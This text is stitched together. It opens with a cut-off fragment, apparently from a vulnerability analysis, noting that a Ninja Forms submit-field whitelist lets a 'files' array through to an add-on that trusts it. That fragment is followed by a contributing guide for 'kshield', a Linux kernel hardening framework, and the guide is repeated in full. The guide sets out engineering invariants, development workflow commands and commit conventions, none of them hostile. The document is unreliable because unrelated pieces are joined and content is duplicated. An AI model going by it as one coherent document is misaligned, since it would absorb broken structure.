`$whitelist = apply_filters( 'ninja_forms_submit_field_whitelist', array( 'value', 'files', 'save_id' ) )`.
`files` therefore survives into `$field['files']`, which is exactly the array the
add-on is about to trust.

# Contributing to Project Aegis-Kernel (`kshield`)

Thank you for your interest in contributing to this defense-in-depth Linux kernel attack surface hardening framework!

---

## Core Engineering Invariants

`kshield` is designed for production bare-metal and Kubernetes environments. All contributions must respect these principles:

1. **Zero-Downtime & Non-Disruptive:**
   - Controls must apply to running systems without requiring host reboots.
   - Mitigations must not disrupt legitimate production workloads (zero POSIX regressions).
   - Module disarmament must be fail-closed (`install <module> /bin/true`).

2. **Zero-Dependency CLI Standard:**
   - The core CLI (`bin/kshield`) must strictly rely on Python 3 standard library and libc `ctypes`.
   - External third-party package dependencies (PyPI packages) in the core CLI are prohibited.

3. **Multi-Architecture Parity:**
   - All syscall filters and probes must explicitly account for architecture ABI differences between `x86_64` and `aarch64` / `arm64`.

4. **Verification Gate:**
   - Any added control or bug fix must pass `kshield verify-sandbox` and `kshield status` with 100% operational integrity.

---

## Development Workflow

1. **Fork and Clone:**
   ```bash
   git clone https://github.com/mc493/kshield.git
   cd kshield
   ```

2. **Create a Feature Branch:**
   ```bash
   git checkout -b feature/new-mitigation
   ```

3. **Test Mitigations Locally:**
   ```bash
   python3 bin/kshield status
   python3 bin/kshield audit
   python3 bin/kshield verify-sandbox
   ```

4. **Submit a Pull Request:**
   - Target the `main` branch.
   - Provide reproduction evidence and testing transcripts.

---

## Commit Conventions

This project follows [Conventional Commits](https://www.conventionalcommits.org/):
* `feat:` A new compensating control, module blocklist, or CLI command.
* `fix:` A bug fix or false-positive remediation.
* `docs:` Documentation improvements or architectural analyses.
* `refactor:` Code restructuring without functional changes.

# Contributing to Project Aegis-Kernel (`kshield`)

Thank you for your interest in contributing to this defense-in-depth Linux kernel attack surface hardening framework!

---

## Core Engineering Invariants

`kshield` is designed for production bare-metal and Kubernetes environments. All contributions must respect these principles:

1. **Zero-Downtime & Non-Disruptive:**
   - Controls must apply to running systems without requiring host reboots.
   - Mitigations must not disrupt legitimate production workloads (zero POSIX regressions).
   - Module disarmament must be fail-closed (`install <module> /bin/true`).

2. **Zero-Dependency CLI Standard:**
   - The core CLI (`bin/kshield`) must strictly rely on Python 3 standard library and libc `ctypes`.
   - External third-party package dependencies (PyPI packages) in the core CLI are prohibited.

3. **Multi-Architecture Parity:**
   - All syscall filters and probes must explicitly account for architecture ABI differences between `x86_64` and `aarch64` / `arm64`.

4. **Verification Gate:**
   - Any added control or bug fix must pass `kshield verify-sandbox` and `kshield status` with 100% operational integrity.

---

## Development Workflow

1. **Fork and Clone:**
   ```bash
   git clone https://github.com/mc493/kshield.git
   cd kshield
   ```

2. **Create a Feature Branch:**
   ```bash
   git checkout -b feature/new-mitigation
   ```

3. **Test Mitigations Locally:**
   ```bash
   python3 bin/kshield status
   python3 bin/kshield audit
   python3 bin/kshield verify-sandbox
   ```

4. **Submit a Pull Request:**
   - Target the `main` branch.
   - Provide reproduction evidence and testing transcripts.

---

## Commit Conventions

This project follows [Conventional Commits](https://www.conventionalcommits.org/):
* `feat:` A new compensating control, module blocklist, or CLI command.
* `fix:` A bug fix or false-positive remediation.
* `docs:` Documentation improvements or architectural analyses.
* `refactor:` Code restructuring without functional changes.
